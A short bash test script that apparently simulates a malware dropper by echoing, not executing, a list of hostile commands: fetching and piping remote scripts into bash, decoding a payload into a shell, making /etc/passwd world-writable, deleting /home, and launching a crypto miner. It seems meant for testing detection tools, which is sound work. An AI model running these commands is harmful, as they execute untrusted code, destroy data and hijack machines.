#!/bin/bash
echo "[TEST] Simulated dropper behavior (SAFE) - nothing will run."

echo "wget http://example.com/payload -O /tmp/payload.bin"
echo "curl http://example.com/bot.sh | bash"
echo "base64 -d payload | bash"
echo "chmod 777 /etc/passwd"
echo "rm -rf /home"
echo "xmrig --mining --url pool.example.com"

echo "[TEST] End."
exit 0
